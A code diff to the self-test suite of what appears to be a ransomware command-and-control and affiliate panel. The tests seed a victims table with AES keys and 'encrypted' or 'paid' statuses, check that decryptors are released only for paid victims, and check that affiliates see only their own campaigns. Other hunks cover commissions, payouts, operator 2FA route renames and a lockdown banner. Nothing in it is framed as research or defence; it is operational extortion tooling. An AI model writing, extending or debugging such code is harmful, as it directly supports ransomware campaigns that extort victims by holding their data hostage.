@@ -693,8 +693,8 @@ ok("backup code single-use", login("totpuser", "totppass1", codes[0]).status_cod
 
 # ---- root TOTP ----------------------------------------------------------
 login("root", "selftest-root-pass")
-t = csrf("/admin/root/2fa")
-CL.post("/admin/root/2fa", data={"csrf": t, "action": "enroll",
+t = csrf("/admin/2fa")
+CL.post("/admin/2fa", data={"csrf": t, "action": "enroll",
                                  "password": "selftest-root-pass"})
 with c2db.db() as conn:
     root_secret = conn.execute("SELECT totp_secret FROM operators "
@@ -703,8 +703,8 @@ ok("root 2fa enrolled", bool(root_secret))
 ok("root login needs code", login("root", "selftest-root-pass").status_code == 401)
 ok("root login with code", login("root", "selftest-root-pass",
                                  c2db.totp_code(root_secret)).status_code == 302)
-t = csrf("/admin/root/2fa")
-CL.post("/admin/root/2fa", data={"csrf": t, "action": "disable",
+t = csrf("/admin/2fa")
+CL.post("/admin/2fa", data={"csrf": t, "action": "disable",
                                  "code": c2db.totp_code(root_secret)})
 ok("root 2fa disabled", login("root", "selftest-root-pass").status_code == 302)
 # Step-up replay state must never put the new master/pins in the cookie.
@@ -865,6 +865,27 @@ c2db.set_commission("affiliate1", 10)
 c2db.add_payment(vid, 100.0, "aff", "", "admin", "affiliate1")
 login("affiliate1", "affpass123")
 ok("affiliate portal", b"Affiliate" in CL.get("/affiliate").data)
+aff_cid = c2db.create_campaign("AffOnly", affiliate="affiliate1")
+other_cid = c2db.create_campaign("OtherCamp", affiliate="admin")
+aff_paid = "affpaid000000001"
+aff_unpaid = "affunpaid0000001"
+_key = base64.b64encode(b"K" * 32).decode()
+with c2db.db() as conn:
+    conn.execute("INSERT INTO victims (vid, aes_key, hostname, status, timestamp, "
+                 "campaign_id) VALUES (?,?,?,?,?,?)",
+                 (aff_paid, _key, "AFF-PAID", "paid", c2db.now(), aff_cid))
+    conn.execute("INSERT INTO victims (vid, aes_key, hostname, status, timestamp, "
+                 "campaign_id) VALUES (?,?,?,?,?,?)",
+                 (aff_unpaid, _key, "AFF-UNPAID", "encrypted", c2db.now(), aff_cid))
+    conn.commit()
+ok("affiliate campaign list", b"AffOnly" in CL.get("/affiliate").data)
+ok("affiliate opens own campaign",
+   CL.get("/affiliate/campaign/%d" % aff_cid).status_code == 200)
+ok("affiliate paid decrypter", CL.get("/affiliate/decryptor/" + aff_paid).status_code == 200)
+ok("affiliate unpaid decrypter blocked",
+   CL.get("/affiliate/decryptor/" + aff_unpaid).status_code == 403)
+ok("affiliate cannot open other campaign",
+   CL.get("/affiliate/campaign/%d" % other_cid).status_code == 404)
 af_csrf = csrf("/affiliate")
 ok("affiliate request blocked over balance",
    b"invalid payout request" in CL.post("/affiliate/request",
@@ -875,6 +896,9 @@ ok("affiliate payout requested", any(abs(p["amount"] - 5) < 0.01
                                      and p["status"] == "requested"
                                      for p in c2db.list_payouts()))
 login("admin", "selftest-pass")
+c2db.log_event("root", "root_probe_event", "", "phantom")
+ok("root events hidden from admin",
+   b"root_probe_event" not in CL.get("/admin/events").data)
 pid = [p["id"] for p in c2db.list_payouts() if p["status"] == "requested"][0]
 post("/admin/payout/%d/approved" % pid, {})
 ok("payout approved", [p["status"] for p in c2db.list_payouts()
@@ -1011,8 +1035,8 @@ ok("root theme", b'class="root-badge"' in CL.get("/admin").data)
 with c2db.db() as conn:
     rr = conn.execute("SELECT * FROM operators WHERE role='root' LIMIT 1").fetchone()
 if not rr["totp_secret"]:
-    t = csrf("/admin/root/2fa")
-    CL.post("/admin/root/2fa", data={"csrf": t, "action": "enroll",
+    t = csrf("/admin/2fa")
+    CL.post("/admin/2fa", data={"csrf": t, "action": "enroll",
                                      "password": "selftest-root-pass"})
     with c2db.db() as conn:
         rr = conn.execute("SELECT * FROM operators WHERE role='root' LIMIT 1").fetchone()
@@ -1093,7 +1117,7 @@ r = CL.post("/admin/root/lockdown", data={"csrf": t, "on": "1"})
 ok("lockdown enabled", r.status_code == 302
    and c2db.get_setting("lockdown") == "1")
 login("admin", "selftest-pass")
-ok("lockdown banner for admin", b"ROOT LOCKDOWN" in CL.get("/admin").data)
+ok("lockdown banner for admin", b"SYSTEM LOCKDOWN" in CL.get("/admin").data)
 t = csrf("/admin")
 r = CL.post("/admin/settings", data={"csrf": t, "price_usd": "1"})
 ok("lockdown blocks admin POST", r.status_code == 403)
@@ -1330,10 +1354,10 @@ rpc_srv.shutdown()
 c2db.set_setting("require_2fa", "1")
 r = login("admin", "selftest-pass")
 ok("admin 2fa enrollment redirect", r.status_code == 302 and
-   "/admin/root/2fa" in (r.headers.get("Location") or ""))
-ok("admin 2fa enrollment page", CL.get("/admin/root/2fa").status_code == 200)
-_t = csrf("/admin/root/2fa")
-CL.post("/admin/root/2fa", data={"csrf": _t, "action": "enroll",
+   "/admin/2fa" in (r.headers.get("Location") or ""))
+ok("admin 2fa enrollment page", CL.get("/admin/2fa").status_code == 200)
+_t = csrf("/admin/2fa")
+CL.post("/admin/2fa", data={"csrf": _t, "action": "enroll",
                                  "password": "selftest-pass"})
 with c2db.db() as conn:
     adm = conn.execute("SELECT totp_secret, backup_codes FROM operators "
